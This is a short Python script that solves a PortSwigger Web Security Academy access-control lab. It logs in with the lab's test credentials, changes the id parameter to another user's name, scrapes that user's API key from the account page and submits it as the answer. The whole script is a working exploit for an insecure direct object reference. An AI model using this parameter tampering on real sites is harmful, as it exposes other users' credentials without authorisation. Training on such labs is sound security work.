# Lab: User ID controlled by request parameter
# https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter 

import requests
import re

session = requests.Session()
base_url = "https://ID.web-security-academy.net"

# Login with wiener:peter
login_data = {"username": "wiener", "password": "peter"}
response = session.post(f"{base_url}/login", data=login_data)

#access API key of carlos by changing id parameter from wiener to carlos
exploit_url = f"{base_url}/my-account?id=carlos"
response = session.get(exploit_url)
match = re.search(r"Your API Key is: ([A-Za-z0-9]+)", response.text)
if match:
    api_key = match.group(1)
    print(api_key)
    #submit the api key
    submit_url = f"{base_url}/submitSolution"
    data = {"answer": api_key}
    submit_response = session.post(submit_url, data=data)
else:
    print("API key not found")